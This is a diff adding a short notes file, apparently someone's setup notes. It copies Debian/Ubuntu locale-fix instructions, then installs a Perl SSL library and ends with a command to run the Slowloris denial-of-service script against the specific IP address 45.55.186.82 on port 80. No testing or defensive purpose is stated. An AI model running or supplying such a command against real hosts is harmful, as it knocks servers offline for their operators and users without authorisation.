@@ -1,0 +1,24 @@
+============ configure ==========
+https://www.thomas-krenn.com/en/wiki/Perl_warning_Setting_locale_failed_in_Debian
+
+Missing locales are generated with locale-gen:
+
+locale-gen en_US.UTF-8
+Alternatively a locale file can be created manually with localedef:[1]
+
+localedef -i en_US -f UTF-8 en_US.UTF-8
+Setting Locale Settings
+The locale settings can be set (to en_US.UTF-8 in the example) as follows:
+
+export LANGUAGE=en_US.UTF-8
+export LANG=en_US.UTF-8
+export LC_ALL=en_US.UTF-8
+locale-gen en_US.UTF-8
+dpkg-reconfigure locales
+The dpkg-reconfigure locales command will open a dialog under Debian for selecting the desired locale. This dialog will not appear under Ubuntu. The Configure Locales in Ubuntu article shows how to find the information regarding Ubuntu.
+
+
+sudo apt-get install libio-socket-ssl-perl
+
+usar 
+ perl slowloris.pl  -dns  45.55.186.82 -port 80
